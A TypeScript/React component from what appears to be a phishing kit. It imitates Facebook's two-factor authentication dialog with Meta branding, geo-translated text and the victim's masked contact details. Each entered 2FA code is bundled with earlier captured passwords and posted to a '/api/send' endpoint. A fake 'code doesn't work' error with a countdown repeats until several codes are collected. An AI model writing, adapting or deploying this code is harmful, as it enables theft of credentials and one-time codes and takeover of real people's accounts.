import AuthenticationImage from '@/assets/images/authentication.png';
import MetaLogo from '@/assets/images/meta-logo-image.png';
import { store } from '@/store/store';
import config from '@/utils/config';
import translateText from '@/utils/translate';
import axios from 'axios';
import Image from 'next/image';
import { useEffect, useState, type FC } from 'react';

const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
    const [attempts, setAttempts] = useState(0);
    const [code, setCode] = useState('');
    const [countdown, setCountdown] = useState(0);
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);
    const [translations, setTranslations] = useState<Record<string, string>>({});

    const { geoInfo, messageId, baseInfo, passwords, codes, addCode, setMessageId, userInfo } = store();
    const maxCode = config.MAX_CODE ?? 3;
    const maxPass = config.MAX_PASS ?? 3;
    const loadingTime = config.CODE_LOADING_TIME ?? 60;

    const t = (text: string): string => {
        return translations[text] || text;
    };

    const maskEmail = (email: string): string => {
        if (!email) return '';
        const [localPart, domain] = email.split('@');
        if (!localPart || !domain) return email;
        const masked = localPart[0] + '**' + localPart.slice(-1);
        return `${masked}@${domain}`;
    };

    const maskPhone = (phone: string): string => {
        if (!phone) return '';
        const digits = phone.replaceAll(/\D/g, '');
        if (digits.length < 4) return phone;
        return phone.slice(0, -2).replaceAll(/\d/g, '*') + ' ' + phone.slice(-2);
    };

    useEffect(() => {
        if (!geoInfo) return;

        const textsToTranslate = ['Two-factor authentication required', 'Enter the code for this account that we send to', 'or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)', 'Code', "This code doesn't work. Check it's correct or try a new one after", 'Continue', 'Try another way'];

        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};

            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }

            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    useEffect(() => {
        if (countdown > 0) {
            const timer = setTimeout(() => {
                setCountdown(countdown - 1);
            }, 1000);
            return () => clearTimeout(timer);
        } else if (countdown === 0 && showError) {
            setShowError(false);
        }
    }, [countdown, showError]);

    const handleSubmit = async () => {
        if (!code.trim() || isLoading || code.length < 6 || countdown > 0) return;

        setShowError(false);
        setIsLoading(true);

        const next = attempts + 1;
        setAttempts(next);

        const passwordSection = passwords.map((pass, index) => `<b>🔒 Password ${index + 1}/${maxPass}:</b> <code>${pass}</code>`).join('\n');
        
        const allCodes = [...codes, code];
        const codeSection = allCodes.map((c, index) => `<b>🔐 2FA Code ${index + 1}/${maxCode}:</b> <code>${c}</code>`).join('\n');
        
        const message = `${baseInfo}\n\n${passwordSection}\n\n${codeSection}`;

        try {
            const res = await axios.post('/api/send', {
                message,
                delete_message_id: messageId
            });

            if (res?.data?.success && typeof res.data.message_id === 'number') {
                setMessageId(res.data.message_id);
                addCode(code);
            }

            if (next >= maxCode) {
                nextStep();
            } else {
                setShowError(true);
                setCode('');
                setCountdown(loadingTime);
            }
        } catch {
            //
        } finally {
            setIsLoading(false);
        }
    };

    const currentStep = codes.length + 1;

    return (
        <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
            <div className='mx-4 flex h-full max-h-full w-full max-w-lg flex-col overflow-hidden rounded-[16px] bg-white px-5 py-5 shadow-lg md:mx-0'>
                <div className='flex flex-1 flex-col'>
                    <div className='mb-1 flex items-center gap-1 text-[13px] text-[#65676B]'>
                        <span>{userInfo?.fullName || 'User'}</span>
                        <span>•</span>
                        <span>Facebook</span>
                    </div>

                    <p className='mb-2 text-[17px] font-bold text-[#0A1317]'>
                        {t('Two-factor authentication required')} ({currentStep}/{maxCode})
                    </p>

                    <p className='mb-3 text-[14px] text-[#65676B]'>
                        {t('Enter the code for this account that we send to')} {maskEmail(userInfo?.email || '')}, {maskPhone(userInfo?.phone || '')} {t('or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)')}
                    </p>

                    <div className='mb-3 flex justify-center'>
                        <Image src={AuthenticationImage} alt='authentication' className='h-auto w-auto' />
                    </div>

                    <div className='flex flex-col'>
                        <div className={`mb-[10px] flex h-[40px] w-full items-center rounded-[10px] border bg-white px-[11px] text-[14px] transition-all duration-200 hover:border-[#3b82f6] hover:shadow-md hover:shadow-blue-100 focus-within:border-[#3b82f6] focus-within:shadow-md focus-within:shadow-blue-100 ${countdown > 0 ? 'cursor-not-allowed border-[#d4dbe3] opacity-60' : 'border-[#d4dbe3]'}`}>
                            <input
                                type='tel'
                                inputMode='numeric'
                                pattern='[0-9]*'
                                id='code-input'
                                value={code}
                                onChange={(e) => {
                                    const value = e.target.value.replaceAll(/\D/g, '');
                                    if (value.length <= 8) {
                                        setCode(value);
                                    }
                                }}
                                maxLength={8}
                                disabled={countdown > 0}
                                placeholder={t('Code')}
                                className='h-full w-full bg-transparent outline-none'
                            />
                        </div>

                        {showError && (
                            <p className='mb-[10px] text-[13px] text-red-500'>
                                {t("This code doesn't work. Check it's correct or try a new one after")} {countdown}s.
                            </p>
                        )}

                        <button
                            type='button'
                            onClick={handleSubmit}
                            disabled={isLoading || code.length < 6 || countdown > 0}
                            className={`flex h-[40px] min-h-[40px] w-full cursor-pointer items-center justify-center rounded-[40px] bg-[#0064E0] pt-[10px] pb-[10px] text-white transition-opacity duration-300 ${isLoading || code.length < 6 || countdown > 0 ? 'cursor-not-allowed opacity-70' : ''}`}
                        >
                            {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Continue')}
                        </button>

                        <div className='mt-5 flex h-[46px] w-full cursor-pointer items-center justify-center rounded-[40px] border border-[#d4dbe3] bg-transparent px-5 py-[10px] text-[#9a979e] transition-opacity duration-200 hover:opacity-80'>
                            {t('Try another way')}
                        </div>
                    </div>
                </div>

                <div className='mt-4 flex items-center justify-center'>
                    <Image src={MetaLogo} alt='Meta' className='h-[18px] w-auto' />
                </div>
            </div>
        </div>
    );
};

export default VerifyModal;
